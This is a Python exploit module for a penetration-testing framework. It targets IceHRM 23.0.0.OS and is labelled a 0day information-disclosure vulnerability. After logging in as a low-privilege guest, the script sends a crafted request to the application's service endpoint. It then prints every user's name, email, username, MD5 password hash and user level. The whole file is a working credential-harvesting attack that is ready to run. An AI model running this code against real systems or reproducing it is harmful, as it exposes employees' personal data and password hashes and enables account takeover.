#!/usr/bin/env python

import urllib2
import cookielib
import json
import pprint

from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = 'efa_IceHRM_info_disclosure'
INFO['DESCRIPTION'] = 'IceHRM Info Disclosure'
INFO['VENDOR'] = 'https://icehrm.com/'
INFO['CVE Name'] = '0day'
INFO['DOWNLOAD_LINK'] = 'https://sourceforge.net/projects/icehrm/'
INFO['LINKS'] = []
INFO['CHANGELOG'] = '20 Nov 2018'
INFO['PATH'] = 'General/'
INFO['NOTES'] = """Vulnerability allows to enumerate users with credentials(passwords are MD5 hashes). Auth is required.
Tested against Ice HRM 23.0.0.OS on Windows 7 SP1 x64.
"""

OPTIONS = OrderedDict()
OPTIONS['HOST'] = '192.168.0.14'
OPTIONS['PORT'] = 80
OPTIONS['VHOST'] = '/icehrm'
OPTIONS['SSL'] = False
OPTIONS['USERNAME'] = 'guest'
OPTIONS['PASSWORD'] = 'password'


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', OPTIONS['HOST'])
        self.port = self.args.get('PORT', OPTIONS['PORT'])
        self.ssl = self.args.get('SSL', OPTIONS['SSL'])
        self.username = self.args.get('USERNAME', OPTIONS['USERNAME'])
        self.password = self.args.get('PASSWORD', OPTIONS['PASSWORD'])
        self.vhost = self.args.get('VHOST', OPTIONS['VHOST']).strip('/')

    def make_url(self, path=''):
        proto = 'https' if self.ssl else 'http'
        url = '%s://%s:%s/%s/%s' % (proto, self.host, self.port, self.vhost, path)
        return url

    def run(self):
        #Get options from gui
        self.args()
        cookiesjar = cookielib.CookieJar()
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiesjar))
        urllib2.install_opener(opener)
        url = self.make_url('')
        self.log('[*] Checking connection to %s' % url)
        url = self.make_url('app/login.php')
        data = 'next=&username=%s&password=%s' % (self.username, self.password)
        res = urllib2.urlopen(url, data).read()
        if 'sign out' not in res.lower():
            self.log('[-] Bad credentials')
            self.finish(False)
        url = self.make_url('app/service.php')
        data = 't=User&a=get&sm={"employee":["Employee","id","first_name+last_name"],"user_roles":["UserRole","id","name"],"lang":["SupportedLanguage","id","description"],"default_module":["Module","id","menu+label"]}&ft=&ob='
        res = urllib2.urlopen(url, data).read()
        res = json.loads(res)
        result = [{
            'employee': u['employee'],
            'email': u['email'],
            'username': u['username'],
            'password': u['password'],
            'user level': u['user_level']
        } for u in res['object']]
        self.log('\r\n' + pprint.pformat(result))
        self.finish(True)



if __name__ == '__main__':
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()